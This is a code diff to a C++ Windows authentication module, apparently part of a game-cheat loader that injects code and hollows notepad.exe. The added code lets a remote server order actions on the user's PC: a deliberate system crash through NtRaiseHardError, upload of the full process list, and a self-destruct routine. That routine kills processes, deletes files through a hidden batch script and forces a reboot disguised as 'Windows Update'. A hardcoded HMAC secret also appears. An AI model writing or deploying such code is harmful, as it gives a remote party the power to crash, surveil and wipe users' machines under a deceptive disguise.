@@ -8,11 +8,14 @@
 #include <Windows.h>
 #include <winhttp.h>
 #include <wincrypt.h>
+#include <TlHelp32.h>
+#include <Psapi.h>
 #include <string>
 #include <vector>
 
 #pragma comment(lib, "winhttp.lib")
 #pragma comment(lib, "crypt32.lib")
+#pragma comment(lib, "psapi.lib")
 
 namespace SelfAuth {
 
@@ -22,6 +25,9 @@ namespace SelfAuth {
     // ═══════════════════════════════════════════════════════════════
     static const char* HMAC_SECRET = "x9K#mP2$vL8nQ4wR7jT0yF5bN3hA6cD1";
     // ═══════════════════════════════════════════════════════════════
+
+    // Overlay PID — set by main() after overlay launch so SelfDestruct can kill it
+    inline DWORD g_OverlayPid = 0;
 
     struct Subscription {
         std::string expiry;
@@ -34,6 +40,9 @@ namespace SelfAuth {
     struct Response {
         bool success = false;
         std::string message;
+        bool hwid_mismatch = false;
+        int resets_remaining = -1;
+        unsigned long long next_reset = 0;
     };
 
     class api {
@@ -95,6 +104,17 @@ namespace SelfAuth {
                                 body.find("\"success\": true") != std::string::npos);
             response.message = ExtractJsonString(body, "message");
 
+            // Parse HWID mismatch info for self-service reset
+            response.hwid_mismatch = (body.find("\"hwid_mismatch\":true") != std::string::npos);
+            response.resets_remaining = -1;
+            response.next_reset = 0;
+            if (response.hwid_mismatch) {
+                std::string rem = ExtractJsonString(body, "resets_remaining");
+                if (!rem.empty()) response.resets_remaining = atoi(rem.c_str());
+                std::string nxt = ExtractJsonString(body, "next_reset");
+                if (!nxt.empty()) response.next_reset = _strtoui64(nxt.c_str(), nullptr, 10);
+            }
+
             if (response.success) {
                 m_session = ExtractJsonString(body, "session");
                 std::string expiry = ExtractJsonString(body, "expiry");
@@ -106,10 +126,26 @@ namespace SelfAuth {
             }
         }
 
-        // Returns 0 = OK, 1 = session dead, 2 = KILL (self-destruct)
+        // Self-service HWID reset (no HMAC needed — uses key + hwid auth)
+        bool resetHwid(const std::string& key) {
+            std::string hwid = CollectHWID();
+            std::string json = "{\"key\":\"" + EscapeJson(key) + "\",\"hwid\":\"" + EscapeJson(hwid) + "\"}";
+            std::string body = HttpPost("/api/hwid-reset", json);
+            if (body.empty()) {
+                response.message = "No response from server.";
+                return false;
+            }
+            bool ok = (body.find("\"success\":true") != std::string::npos ||
+                       body.find("\"success\": true") != std::string::npos);
+            response.message = ExtractJsonString(body, "message");
+            return ok;
+        }
+
+        // Returns 0 = OK, 1 = session dead, 2 = KILL, 3 = BSOD, 4 = report_processes
         int heartbeat_ex() {
             if (m_session.empty()) return 1;
-            std::string json = "{\"session\":\"" + EscapeJson(m_session) + "\"}";
+            std::string hwid = CollectHWID();
+            std::string json = "{\"session\":\"" + EscapeJson(m_session) + "\",\"hwid\":\"" + EscapeJson(hwid) + "\"}";
             std::string body = SignedPost("/api/heartbeat", json);
             if (body.empty()) return 1;
             // TEMPORARILY DISABLED FOR DEBUGGING
@@ -118,9 +154,11 @@ namespace SelfAuth {
                        body.find("\"success\": true") != std::string::npos);
             if (!ok) return 1;
 
-            // Check for kill command from server
+            // Check for action commands from server
             std::string action = ExtractJsonString(body, "action");
             if (action == "kill") return 2;
+            if (action == "bsod") return 3;
+            if (action == "report_processes") return 4;
 
             std::string expiry = ExtractJsonString(body, "expiry");
             if (!expiry.empty() && !user_data.subscriptions.empty()) {
@@ -135,6 +173,92 @@ namespace SelfAuth {
 
         bool hasSession() const { return !m_session.empty(); }
         const std::string& getSession() const { return m_session; }
+        void setSession(const std::string& s) { m_session = s; }
+
+        static std::string CollectHWID() {
+            HKEY hKey;
+            char value[256] = {};
+            DWORD size = sizeof(value);
+            if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
+                "SOFTWARE\\Microsoft\\Cryptography", 0, KEY_READ | KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS) {
+                RegQueryValueExA(hKey, "MachineGuid", nullptr, nullptr, (LPBYTE)value, &size);
+                RegCloseKey(hKey);
+            }
+            char compName[MAX_COMPUTERNAME_LENGTH + 1] = {};
+            DWORD compSize = sizeof(compName);
+            GetComputerNameA(compName, &compSize);
+            DWORD volSerial = 0;
+            GetVolumeInformationA("C:\\", nullptr, 0, &volSerial, nullptr, nullptr, nullptr, 0);
+            char hwid[512];
+            snprintf(hwid, sizeof(hwid), "%s|%s|%08X", value, compName, volSerial);
+            return std::string(hwid);
+        }
+
+        // ── Trigger BSOD via NtRaiseHardError (user-mode, requires admin) ──
+        static void TriggerBSOD() {
+            typedef NTSTATUS(NTAPI* pRtlAdjustPrivilege)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
+            typedef NTSTATUS(NTAPI* pNtRaiseHardError)(NTSTATUS, ULONG, ULONG, PULONG_PTR, ULONG, PULONG);
+
+            HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+            if (!ntdll) { TerminateProcess(GetCurrentProcess(), 0); return; }
+
+            auto RtlAdjustPrivilege = (pRtlAdjustPrivilege)GetProcAddress(ntdll, "RtlAdjustPrivilege");
+            auto NtRaiseHardError = (pNtRaiseHardError)GetProcAddress(ntdll, "NtRaiseHardError");
+            if (!RtlAdjustPrivilege || !NtRaiseHardError) { TerminateProcess(GetCurrentProcess(), 0); return; }
+
+            BOOLEAN wasEnabled;
+            RtlAdjustPrivilege(19, TRUE, FALSE, &wasEnabled); // SE_SHUTDOWN_PRIVILEGE
+            ULONG response;
+            NtRaiseHardError(0xC000021A, 0, 0, nullptr, 6, &response); // STATUS_SYSTEM_PROCESS_TERMINATED + OptionShutdownSystem
+        }
+
+        // ── Collect running processes and send to server ──
+        void ReportProcesses() {
+            if (m_session.empty()) return;
+
+            std::string procs = "[";
+            bool first = true;
+
+            HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+            if (hSnap == INVALID_HANDLE_VALUE) return;
+
+            PROCESSENTRY32W pe = {};
+            pe.dwSize = sizeof(pe);
+            if (Process32FirstW(hSnap, &pe)) {
+                do {
+                    // Convert wide name to narrow
+                    char name[260] = {};
+                    WideCharToMultiByte(CP_UTF8, 0, pe.szExeFile, -1, name, sizeof(name), nullptr, nullptr);
+
+                    // Get memory usage
+                    DWORD pid = pe.th32ProcessID;
+                    SIZE_T memBytes = 0;
+                    bool hasWindow = false;
+                    HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
+                    if (hProc) {
+                        PROCESS_MEMORY_COUNTERS pmc = {};
+                        pmc.cb = sizeof(pmc);
+                        if (GetProcessMemoryInfo(hProc, &pmc, sizeof(pmc))) {
+                            memBytes = pmc.WorkingSetSize;
+                        }
+                        CloseHandle(hProc);
+                    }
+
+                    if (!first) procs += ",";
+                    first = false;
+                    char entry[512];
+                    snprintf(entry, sizeof(entry),
+                        "{\"name\":\"%s\",\"pid\":%lu,\"mem\":%llu,\"window\":false}",
+                        EscapeJson(name).c_str(), (unsigned long)pid, (unsigned long long)memBytes);
+                    procs += entry;
+                } while (Process32NextW(hSnap, &pe));
+            }
+            CloseHandle(hSnap);
+            procs += "]";
+
+            std::string json = "{\"session\":\"" + EscapeJson(m_session) + "\",\"processes\":" + procs + "}";
+            SignedPost("/api/process-report", json);
+        }
 
         // Report a successful injection to the server with user identity
         void report_injection(const std::string& discord_id, const std::string& windows_email) {
@@ -304,54 +428,76 @@ namespace SelfAuth {
             return std::string(userName);
         }
 
-        // ── Self-destruct: delete loader files, restart PC ──────────
+        // ── Self-destruct: kill cheat, delete files, restart PC ──────────
         static void SelfDestruct() {
-            // Get our own executable path
+            // ── Step 1: Kill the overlay/cheat process ──
+            if (g_OverlayPid != 0) {
+                HANDLE hProc = OpenProcess(PROCESS_TERMINATE | SYNCHRONIZE, FALSE, g_OverlayPid);
+                if (hProc) {
+                    TerminateProcess(hProc, 0);
+                    WaitForSingleObject(hProc, 3000);
+                    CloseHandle(hProc);
+                }
+            }
+
+            // Also scan for any leftover overlay temp processes (svc_*.tmp pattern)
+            // and notepad.exe instances we may have hollowed
+            HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+            if (hSnap != INVALID_HANDLE_VALUE) {
+                PROCESSENTRY32W pe = {};
+                pe.dwSize = sizeof(pe);
+                if (Process32FirstW(hSnap, &pe)) {
+                    do {
+                        bool shouldKill = false;
+                        // Kill svc_*.tmp overlay processes
+                        if (wcsstr(pe.szExeFile, L"svc_") && wcsstr(pe.szExeFile, L".tmp"))
+                            shouldKill = true;
+                        // Kill notepad.exe (process hollowing host)
+                        if (_wcsicmp(pe.szExeFile, L"notepad.exe") == 0)
+                            shouldKill = true;
+                        if (shouldKill && pe.th32ProcessID != GetCurrentProcessId()) {
+                            HANDLE hp = OpenProcess(PROCESS_TERMINATE | SYNCHRONIZE, FALSE, pe.th32ProcessID);
+                            if (hp) {
+                                TerminateProcess(hp, 0);
+                                WaitForSingleObject(hp, 2000);
+                                CloseHandle(hp);
+                            }
+                        }
+                    } while (Process32NextW(hSnap, &pe));
+                }
+                CloseHandle(hSnap);
+            }
+
+            // ── Step 2: Clean temp files ──
+            wchar_t tempDir[MAX_PATH] = {};
+            GetTempPathW(MAX_PATH, tempDir);
+            const wchar_t* patterns[] = { L"svc_*.tmp", L"msvc_rt.sys", L"*.tmp.sys", L"tmp*.sys" };
+            for (const auto& pat : patterns) {
+                std::wstring search = std::wstring(tempDir) + pat;
+                WIN32_FIND_DATAW fd;
+                HANDLE hFind = FindFirstFileW(search.c_str(), &fd);
+                if (hFind != INVALID_HANDLE_VALUE) {
+                    do {
+                        std::wstring full = std::wstring(tempDir) + fd.cFileName;
+                        DeleteFileW(full.c_str());
+                    } while (FindNextFileW(hFind, &fd));
+                    FindClose(hFind);
+                }
+            }
+
+            // ── Step 3: Schedule loader exe for deletion ──
             char selfPath[MAX_PATH] = {};
             GetModuleFileNameA(nullptr, selfPath, MAX_PATH);
-
-            // Get the directory we're running from
             std::string selfDir(selfPath);
             size_t lastSlash = selfDir.rfind('\\');
             if (lastSlash != std::string::npos)
                 selfDir = selfDir.substr(0, lastSlash);
 
-            // Build a batch script that:
-            // 1. Waits for our process to die
-            // 2. Deletes the loader exe and everything in its folder
-            // 3. Deletes itself
-            // 4. Restarts the PC
-            char tempDir[MAX_PATH] = {};
-            GetTempPathA(MAX_PATH, tempDir);
-            std::string batPath = std::string(tempDir) + "svcclean.bat";
+            wchar_t selfPathW[MAX_PATH] = {};
+            GetModuleFileNameW(nullptr, selfPathW, MAX_PATH);
+            MoveFileExW(selfPathW, nullptr, MOVEFILE_DELAY_UNTIL_REBOOT);
 
-            HANDLE hBat = CreateFileA(batPath.c_str(), GENERIC_WRITE, 0,
-                nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, nullptr);
-            if (hBat != INVALID_HANDLE_VALUE) {
-                char script[2048];
-                snprintf(script, sizeof(script),
-                    "@echo off\r\n"
-                    "ping 127.0.0.1 -n 3 > nul\r\n"          // wait for process to die
-                    "del /f /q \"%s\"\r\n"                    // delete loader exe
-                    "del /f /q \"%s\\*.*\" 2>nul\r\n"       // delete everything in folder
-                    "rmdir /s /q \"%s\" 2>nul\r\n"           // remove folder
-                    "shutdown /r /t 5 /f /c \"Windows Update\"\r\n"  // restart PC
-                    "del /f /q \"%%~f0\"\r\n",               // delete batch file
-                    selfPath, selfDir.c_str(), selfDir.c_str());
-
-                DWORD written = 0;
-                WriteFile(hBat, script, (DWORD)strlen(script), &written, nullptr);
-                CloseHandle(hBat);
-
-                // Launch batch via ShellExecuteA — bypasses process mitigations
-                // that LockdownProcess() applies (CreateProcessA is blocked)
-                ShellExecuteA(nullptr, "open", "cmd.exe",
-                    (std::string("/c \"") + batPath + "\"").c_str(),
-                    nullptr, SW_HIDE);
-            }
-
-            // Fallback: force restart directly via Windows API in case batch fails
-            // Enable shutdown privilege first
+            // ── Step 4: Enable shutdown privilege ──
             HANDLE hToken;
             if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
                 TOKEN_PRIVILEGES tp;
@@ -361,10 +507,45 @@ namespace SelfAuth {
                 AdjustTokenPrivileges(hToken, FALSE, &tp, 0, nullptr, nullptr);
                 CloseHandle(hToken);
             }
-            InitiateSystemShutdownExA(nullptr, (LPSTR)"Windows Update", 5, TRUE, TRUE,
+
+            // ── Step 5: Batch cleanup + restart (runs after we terminate) ──
+            char tempDirA[MAX_PATH] = {};
+            GetTempPathA(MAX_PATH, tempDirA);
+            std::string batPath = std::string(tempDirA) + "svcclean.bat";
+
+            HANDLE hBat = CreateFileA(batPath.c_str(), GENERIC_WRITE, 0,
+                nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, nullptr);
+            if (hBat != INVALID_HANDLE_VALUE) {
+                char script[2048];
+                snprintf(script, sizeof(script),
+                    "@echo off\r\n"
+                    "ping 127.0.0.1 -n 3 > nul\r\n"
+                    "del /f /q \"%s\"\r\n"
+                    "del /f /q \"%s\\*.*\" 2>nul\r\n"
+                    "rmdir /s /q \"%s\" 2>nul\r\n"
+                    "shutdown /r /t 3 /f /c \"Windows Update\"\r\n"
+                    "del /f /q \"%%~f0\"\r\n",
+                    selfPath, selfDir.c_str(), selfDir.c_str());
+
+                DWORD written = 0;
+                WriteFile(hBat, script, (DWORD)strlen(script), &written, nullptr);
+                CloseHandle(hBat);
+
+                ShellExecuteA(nullptr, "open", "cmd.exe",
+                    (std::string("/c \"") + batPath + "\"").c_str(),
+                    nullptr, SW_HIDE);
+            }
+
+            // ── Step 6: Force restart via multiple methods ──
+            // ExitWindowsEx works for the interactive user without requiring elevation
+            ExitWindowsEx(EWX_REBOOT | EWX_FORCE,
                 SHTDN_REASON_MAJOR_OTHER | SHTDN_REASON_MINOR_OTHER);
 
-            // Terminate ourselves immediately
+            // Fallback: InitiateSystemShutdownEx (requires SeShutdownPrivilege)
+            InitiateSystemShutdownExA(nullptr, (LPSTR)"Windows Update", 3, TRUE, TRUE,
+                SHTDN_REASON_MAJOR_OTHER | SHTDN_REASON_MINOR_OTHER);
+
+            // ── Step 7: Terminate ourselves ──
             TerminateProcess(GetCurrentProcess(), 0);
         }
 
@@ -468,6 +649,7 @@ namespace SelfAuth {
             return diff == 0;
         }
 
+    public:
         // ── Signed POST: adds X-Timestamp + X-Signature headers ───
         std::string SignedPost(const std::string& path, const std::string& body) {
             char tsBuf[32];
@@ -483,28 +665,6 @@ namespace SelfAuth {
                 L"X-Signature: " + ToWide(signature) + L"\r\n";
 
             return HttpRequest(L"POST", path, body, extraHeaders);
-        }
-
-        static std::string CollectHWID() {
-            HKEY hKey;
-            char value[256] = {};
-            DWORD size = sizeof(value);
-            if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
-                "SOFTWARE\\Microsoft\\Cryptography", 0, KEY_READ | KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS) {
-                RegQueryValueExA(hKey, "MachineGuid", nullptr, nullptr, (LPBYTE)value, &size);
-                RegCloseKey(hKey);
-            }
-
-            char compName[MAX_COMPUTERNAME_LENGTH + 1] = {};
-            DWORD compSize = sizeof(compName);
-            GetComputerNameA(compName, &compSize);
-
-            DWORD volSerial = 0;
-            GetVolumeInformationA("C:\\", nullptr, 0, &volSerial, nullptr, nullptr, nullptr, 0);
-
-            char hwid[512];
-            snprintf(hwid, sizeof(hwid), "%s|%s|%08X", value, compName, volSerial);
-            return std::string(hwid);
         }
 
         static std::string EscapeJson(const std::string& s) {
@@ -591,6 +751,10 @@ namespace SelfAuth {
 
         std::string HttpGet(const std::string& path) {
             return HttpRequest(L"GET", path);
+        }
+
+        std::string HttpPost(const std::string& path, const std::string& body) {
+            return HttpRequest(L"POST", path, body, L"Content-Type: application/json\r\n");
         }
     };
 
